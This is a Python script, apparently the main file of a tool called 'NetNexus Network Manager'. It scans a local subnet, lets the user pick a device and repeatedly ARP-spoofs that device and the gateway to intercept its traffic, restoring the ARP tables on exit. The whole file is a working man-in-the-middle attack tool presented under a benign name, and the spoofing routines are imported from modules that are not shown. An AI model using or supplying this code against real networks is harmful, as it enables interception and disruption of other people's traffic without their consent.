import scapy.all as scapy
import os
import time
from core import scanner, spoof

def main():
    # --- CONFIGURATION ---
    # !!! REPLACE 'wlan0' with your interface name from 'ip a' !!!
    scapy.conf.iface = "wlan0" 
    
    if os.geteuid() != 0:
        print("[-] NetNexus requires root privileges. Please run with: sudo python main.py")
        return

    print("=== NetNexus Network Manager ===")
    target_range = "192.168.8.1/24"
    
    print(f"[*] Scanning {target_range}... This may take a moment.")
    devices = scanner.scan(target_range)
    
    print("\nID\tIP Address\t\tMAC Address\t\tDevice Name")
    print("-" * 85)
    for index, device in enumerate(devices):
        print(f"{index}\t{device['ip']}\t\t{device['mac']}\t{device['name']}")

    try:
        choice = int(input("\nSelect Target ID: "))
        gateway_ip = "192.168.8.1"
        
        target = devices[choice]
        target_mac = target['mac']
        gateway_mac, _ = spoof.get_device_info(gateway_ip)

        if not gateway_mac:
            print("[-] Could not find Gateway. Check your connection.")
            return

        print(f"[*] Intercepting {target['ip']} ({target['name']})...")
        print("[*] Press Ctrl+C to stop.")
        
        while True:
            # Aggressive 0.5s interval for PS5 stability
            spoof.spoof(target['ip'], gateway_ip, target_mac, gateway_mac)
            time.sleep(0.5) 
            
    except KeyboardInterrupt:
        print("\n[*] Shutting down. Restoring ARP tables...")
        spoof.restore(target['ip'], gateway_ip)
        spoof.restore(gateway_ip, target['ip'])
        print("[+] Success.")

if __name__ == "__main__":
    main()
